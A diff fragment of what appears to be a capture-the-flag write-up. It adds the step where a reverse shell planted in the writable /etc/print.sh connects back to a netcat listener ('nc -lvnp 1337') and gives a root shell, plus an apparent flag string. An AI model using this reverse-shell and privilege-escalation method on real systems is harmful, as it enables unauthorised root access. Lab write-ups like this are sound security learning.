@@ -228,4 +228,16 @@ lennie@startup:~/scripts$ ls -la /etc/print.sh
 
 This means that we can put a reverse shell in here ... and hope for the best.
 
+```
+┌──(kali㉿kali)-[/tmp]
+└─$ nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.8.150.214] from (UNKNOWN) [10.10.109.61] 52098
+bash: cannot set terminal process group (2291): Inappropriate ioctl for device
+bash: no job control in this shell
+root@startup:~# 
+```
+
+And ... we have root!
+
 c4ntg3t3n0ughsp1c3
